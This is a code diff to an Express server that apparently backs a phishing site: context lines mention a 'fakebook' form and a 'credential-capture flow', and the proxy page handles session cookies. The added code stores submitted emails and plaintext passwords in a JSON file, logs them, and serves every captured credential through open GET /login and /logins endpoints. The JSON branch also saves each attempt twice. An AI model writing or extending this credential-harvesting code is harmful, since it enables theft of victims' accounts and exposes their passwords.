@@ -10,6 +10,7 @@ require('dotenv').config();
 const app = express();
 const PORT = process.env.PORT || 3000;
 const SESSION_SECRET = process.env.SESSION_SECRET || 'change-this-secret';
+const loginAttemptsPath = path.join(__dirname, 'data', 'login-attempts.json');
 const oauthClients = new Map([
   ['demo-client', { clientSecret: process.env.OAUTH_CLIENT_SECRET || 'demo-secret', redirectUris: ['http://localhost/callback'] }]
 ]);
@@ -139,6 +140,44 @@ function renderProxyPage(req) {
     .replace('{{sessionCookieValue}}', sessionCookieValue);
 }
 
+function ensureLoginAttemptsDb() {
+  const dir = path.dirname(loginAttemptsPath);
+  if (!fs.existsSync(dir)) {
+    fs.mkdirSync(dir, { recursive: true });
+  }
+
+  if (!fs.existsSync(loginAttemptsPath)) {
+    fs.writeFileSync(loginAttemptsPath, '[]', 'utf8');
+  }
+}
+
+function readLoginAttempts() {
+  ensureLoginAttemptsDb();
+
+  try {
+    const raw = fs.readFileSync(loginAttemptsPath, 'utf8');
+    const parsed = JSON.parse(raw);
+    return Array.isArray(parsed) ? parsed : [];
+  } catch (error) {
+    console.error('[DB] Error reading login attempts:', error.message);
+    return [];
+  }
+}
+
+function saveLoginAttempt(email, password) {
+  const attempts = readLoginAttempts();
+  const newAttempt = {
+    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
+    email,
+    password,
+    createdAt: new Date().toISOString()
+  };
+
+  attempts.push(newAttempt);
+  fs.writeFileSync(loginAttemptsPath, JSON.stringify(attempts, null, 2), 'utf8');
+  return newAttempt;
+}
+
 function issueAuthorizationCode(clientId, redirectUri, user) {
   const code = crypto.randomBytes(24).toString('hex');
   authorizationCodes.set(code, {
@@ -246,9 +285,40 @@ app.post('/proxy', (req, res) => {
     </html>`);
 });
 
+app.get('/login', (req, res) => {
+  const attempts = readLoginAttempts();
+
+  if (req.accepts('json')) {
+    return res.json(attempts);
+  }
+
+  return res.status(200).json({
+    message: 'Login attempts database',
+    count: attempts.length,
+    attempts
+  });
+});
+
+app.get('/logins', (req, res) => {
+  const attempts = readLoginAttempts();
+  return res.json(attempts);
+});
+
 app.post('/login', (req, res) => {
+  const { email, password } = req.body || {};
+  const wantsJsonApi = req.headers.accept?.includes('application/json') || req.headers['content-type']?.includes('application/json');
+
+  if (email && password) {
+    const savedAttempt = saveLoginAttempt(email, password);
+    console.log(`[LOGIN-API] Stored credential for ${email} at ${savedAttempt.createdAt}`);
+  }
+
+  if (wantsJsonApi) {
+    const savedAttempt = email && password ? saveLoginAttempt(email, password) : null;
+    return res.status(200).json(savedAttempt || { message: 'No credentials provided' });
+  }
+
   // The browser opens a new tab because the fakebook form submits to a credential-capture flow.
-  const { email, password } = req.body;
   console.log(`[LOGIN] Proxy forwarded credentials for ${email}`);
   console.log(`[LOGIN] Email: ${email} | Password: ${password}`);
 
